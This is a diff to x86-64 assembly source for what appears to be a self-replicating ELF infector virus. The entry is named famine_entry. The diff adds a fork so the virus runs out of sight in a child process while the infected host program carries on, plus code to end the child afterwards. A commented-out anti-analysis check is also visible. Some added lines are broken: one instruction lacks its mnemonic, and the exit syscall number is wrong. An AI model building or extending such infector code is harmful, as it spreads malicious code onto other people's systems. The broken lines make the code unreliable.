@@ -10,12 +10,13 @@
 ;                                                                              ;
 ; **************************************************************************** ;
 
+%define SYSCALL_EXIT		0x0
 %define SYSCALL_WRITE		0x1
 %define SYSCALL_MPROTECT	0xa
 %define STDOUT			0x1
 %define PROT_RWX		0x7
 %define CALL_INSTR_SIZE		0x5
-
+%define SYSCALL_FORK		0x39
 section .text
 	global famine_entry
 	global _start
@@ -96,6 +97,12 @@ mark_below:
 	; call detect_spy
 	; test rax, rax
 	; jnz return_to_client
+;------------------------------; fork virus
+	mov  rax, SYSCALL_FORK
+	syscall
+	test rax, rax
+	jnz return_to_client
+	
 ;------------------------------; make ptld writable
 	mov r8, [rsp + 32]         ; get ptld addr
 	mov r9, [rsp + 24]         ; get ptld len
@@ -122,6 +129,12 @@ add r9, 0x2df0;TMp DEBUG
 ;------------------------------; launch virus
 	mov rdi, rdx
 	call virus
+	add rsp, 48
+	pop r14
+	pop rdx
+	mov rdi, 0
+	rax SYSCALL_EXIT
+	syscall
 ;------------------------------; return to client entry
 return_to_client:
 	mov r11, [rsp + 8]         ; get entry addr
